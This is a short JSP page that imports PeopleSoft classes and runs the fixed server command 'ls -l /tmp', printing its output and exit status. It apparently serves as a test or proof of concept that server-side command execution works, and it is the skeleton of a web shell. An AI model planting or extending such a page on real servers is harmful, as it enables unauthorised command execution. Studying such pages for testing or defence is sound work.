<%@ page import="java.io.*,java.util.*,java.lang.reflect.Method,psft.pt8.jb.JBEntry,psft.pt8.net.NetSession" %>

<!DOCTYPE html>
<html>
<body>
<h2>Test LS</h2>
<pre>
<%
	ProcessBuilder pb = new ProcessBuilder("ls", "-l", "/tmp");
	Process p = pb.start();

	InputStream in = p.getInputStream();
	for (int b = 0; ((b = in.read()) >= 0);)
	{
		out.print((char) b);
	}

	out.println();
	out.println("Done: " + p.waitFor() + " return: " + p.exitValue());
	
%>
</pre>
</body>
</html>
